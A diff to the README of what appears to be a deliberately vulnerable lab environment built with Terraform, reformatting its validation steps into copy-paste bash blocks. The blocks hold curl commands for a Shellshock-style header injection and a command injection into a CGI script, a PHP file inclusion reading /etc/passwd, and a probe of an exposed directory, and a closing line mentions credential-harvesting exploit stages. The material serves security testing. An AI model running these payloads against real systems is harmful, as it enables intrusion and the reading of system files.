@@ -87,12 +87,32 @@ Examples:
 
 ## Fast Validation (no soak)
 - Quick RCE: Menu Option 3
-- Manual checks:
-  - `export TARGET_IP=$(cd terraform && terraform output -raw public_ip)`
-  - `curl -s -H "User-Agent: () { :; }; whoami" http://$TARGET_IP/cgi-bin/exec.cgi`
-  - `curl -s -H "User-Agent: id; hostname; uname -a" http://$TARGET_IP/cgi-bin/exec.cgi`
-  - `curl -s "http://$TARGET_IP/view.php?file=/etc/passwd"`
-  - `curl -s "http://$TARGET_IP:8080/secret/"`
+- Manual checks (copy/paste):
+
+Export instance IP from Terraform:
+```bash
+export TARGET_IP=$(cd terraform && terraform output -raw public_ip)
+```
+
+CGI RCE (Shellshock‑style header — shows web user, expect www-data):
+```bash
+curl -s -H "User-Agent: () { :; }; whoami" http://$TARGET_IP/cgi-bin/exec.cgi
+```
+
+CGI RCE (ID, hostname, kernel info):
+```bash
+curl -s -H "User-Agent: id; hostname; uname -a" http://$TARGET_IP/cgi-bin/exec.cgi
+```
+
+PHP LFI (/etc/passwd):
+```bash
+curl -s "http://$TARGET_IP/view.php?file=/etc/passwd"
+```
+
+Nginx directory listing (:8080/secret/):
+```bash
+curl -s "http://$TARGET_IP:8080/secret/"
+```
 
 ## Runtime Exploits (Option 5)
 - Five stages: system recon, credential harvesting, file enumeration, process enumeration, CIEM
